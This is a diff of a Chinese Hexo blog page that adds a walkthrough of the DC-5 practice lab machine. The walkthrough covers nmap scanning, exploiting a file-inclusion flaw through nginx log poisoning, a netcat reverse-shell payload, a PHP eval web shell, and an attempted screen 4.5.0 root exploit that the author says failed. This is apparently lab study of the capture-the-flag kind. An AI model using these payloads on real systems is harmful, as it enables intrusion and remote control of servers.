@@ -8,18 +8,29 @@
   <link rel="dns-prefetch" href="http://example.com">
   <title>DC-5靶机攻略 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="情报收集 反弹shell 权限提升 总结  情报收集反弹shell权限提升总结">
+  <meta name="description" content="情报收集 反弹shell 权限提升 总结  情报收集获取主机服务 12nmap -sP 192.168.193.0&#x2F;24nmap -A -T4 -p- 192.168.193.138 发现存在http服务，登录网站试试。 发现底下的数字不断发生变化，猜测存在文件包含漏洞。 反弹shell 文件包含漏洞利用首先对参数名进行暴力破解，获取文件包含漏洞的参数名。发现file参数响应长度明显不同，可以知">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DC-5靶机攻略">
 <meta property="og:url" content="http://example.com/2024/07/22/DC-5%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="情报收集 反弹shell 权限提升 总结  情报收集反弹shell权限提升总结">
+<meta property="og:description" content="情报收集 反弹shell 权限提升 总结  情报收集获取主机服务 12nmap -sP 192.168.193.0&#x2F;24nmap -A -T4 -p- 192.168.193.138 发现存在http服务，登录网站试试。 发现底下的数字不断发生变化，猜测存在文件包含漏洞。 反弹shell 文件包含漏洞利用首先对参数名进行暴力破解，获取文件包含漏洞的参数名。发现file参数响应长度明显不同，可以知">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/DC-5/image.png">
+<meta property="og:image" content="http://example.com/img/DC-5/image-1.png">
+<meta property="og:image" content="http://example.com/img/DC-5/image-2.png">
+<meta property="og:image" content="http://example.com/img/DC-5/image-3.png">
+<meta property="og:image" content="http://example.com/img/DC-5/image-4.png">
+<meta property="og:image" content="http://example.com/img/DC-5/image-5.png">
+<meta property="og:image" content="http://example.com/img/DC-5/image-6.png">
+<meta property="og:image" content="http://example.com/img/DC-5/image-7.png">
+<meta property="og:image" content="http://example.com/img/DC-5/image-8.png">
+<meta property="og:image" content="http://example.com/img/DC-5/image-9.png">
 <meta property="article:published_time" content="2024-07-22T01:06:57.000Z">
-<meta property="article:modified_time" content="2024-07-22T03:39:19.721Z">
+<meta property="article:modified_time" content="2024-07-23T07:18:34.954Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="DC系列靶机攻略">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/DC-5/image.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -61,6 +72,8 @@
 				<li><a href="/">主页</a></li>
 	        
 				<li><a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">随笔</a></li>
+	        
+				<li><a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">靶机攻略</a></li>
 	        
 			</ul>
 		</nav>
@@ -118,6 +131,8 @@
 			
 				
 			
+				
+			
 			
 			
 			<nav class="header-nav">
@@ -135,12 +150,14 @@
 			</nav>
 
 			<nav class="header-menu js-header-menu">
-				<ul style="width: 50%">
+				<ul style="width: 70%">
 				
 				
-					<li style="width: 50%"><a href="/">主页</a></li>
+					<li style="width: 33.333333333333336%"><a href="/">主页</a></li>
 		        
-					<li style="width: 50%"><a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">随笔</a></li>
+					<li style="width: 33.333333333333336%"><a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">随笔</a></li>
+		        
+					<li style="width: 33.333333333333336%"><a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">靶机攻略</a></li>
 		        
 				</ul>
 			</nav>
@@ -181,7 +198,34 @@
 <li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
 <li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
 </ul>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><p>获取主机服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24</span><br><span class="line">nmap -A -T4 -p- 192.168.193.138</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-5/image.png" alt="alt text"><br>发现存在http服务，登录网站试试。</p>
+<p><img src="/img/DC-5/image-1.png" alt="alt text"><br>发现底下的数字不断发生变化，猜测存在文件包含漏洞。</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><ol>
+<li><p>文件包含漏洞利用<br>首先对参数名进行暴力破解，获取文件包含漏洞的参数名。<br><img src="/img/DC-5/image-2.png" alt="alt text"><br>发现file参数响应长度明显不同，可以知道参数名为file<br><img src="/img/DC-5/image-3.png" alt="alt text"><br>接下来暴力破解包含的文件名，看看可以获取哪些信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=../etc/passwd</span><br><span class="line">?page=file:///etc/passwd</span><br><span class="line">?home=main.cgi</span><br><span class="line">?page=http://xxx/1.php</span><br><span class="line">http://xxx/../../../file.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-5/image-4.png" alt="alt text"><br>爆破出密码文件，再一次验证文件包含漏洞。</p>
+</li>
+<li><p>利用文件包含漏洞获取反弹shell<br>nginx日志的默认日志路徑为&#x2F;var&#x2F;log&#x2F;nginx&#x2F;,一般nginx的日志都有access.log和error.log文件，可以访问试试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.193.138/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-5/image-5.png" alt="alt text"><br>发现里面包含http请求记录，可以试试一句话木马。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改浏览器参数符号会被转化，使用brup修改参数。</span><br><span class="line">GET /thankyou.php?file=&lt;?php phpinfo(); ?&gt; HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-5/image-6.png" alt="alt text"><br>发现成功注入，接下来使用一句话木马，或者直接执行命令连接，获取反弹shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 直接连接</span><br><span class="line">&lt;?php</span><br><span class="line">system(&quot;nc -e /bin/bash 192.168.193.128 10086&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># 使用蚁剑工具连接</span><br><span class="line">&lt;?php eval(@$_POST[&#x27;shell&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>使用find查看是否有可以利用的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f -exec ls -la &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-5/image-7.png" alt="alt text"><br>发现screen-4.5.0命令，看看是否可以利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br><span class="line">searchsploit -p linux/local/41154.sh</span><br><span class="line"># 查看脚本文件格式</span><br><span class="line">cat -A a.sh </span><br><span class="line"># 每个操作系统以字符表示结尾的时候是不同的，查看脚本文件若每行结尾为 ^M</span><br><span class="line"># 则需要使用命令 转换</span><br><span class="line">dos2unix a.sh </span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-5/image-8.png" alt="alt text"><br>发现这个脚本存在权限提升漏洞，上传攻击脚本到服务器，由于&#x2F;tmp文件夹限制最小，一般上传到这个文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 打开kali linux ssh服务</span><br><span class="line">service ssh restart</span><br><span class="line"></span><br><span class="line"># 传输文件</span><br><span class="line">scp root@192.168.193.128:/tmp/a.sh /tmp/a.sh</span><br><span class="line">scp root@192.168.193.128:/tmp/rootshell /tmp/rootshell</span><br><span class="line">scp root@192.168.193.128:/tmp/libhax.so /tmp/libhax.so</span><br><span class="line"></span><br><span class="line">scp root@192.168.193.128:/tmp/rootshell.c /tmp/rootshell.c</span><br><span class="line">scp root@192.168.193.128:/tmp/libhax.c /tmp/libhax.c</span><br></pre></td></tr></table></figure>
+<p>最后一步执行脚本报错，不知道什么貌似gcc版本不对。<br><img src="/img/DC-5/image-9.png" alt="alt text"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>网站存在文件包含漏洞，同时nginx会将访问记录存储在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log里面。</li>
+<li>screen 4.5.0存在本地权限提升漏洞。</li>
+</ol>
+
       
 
       
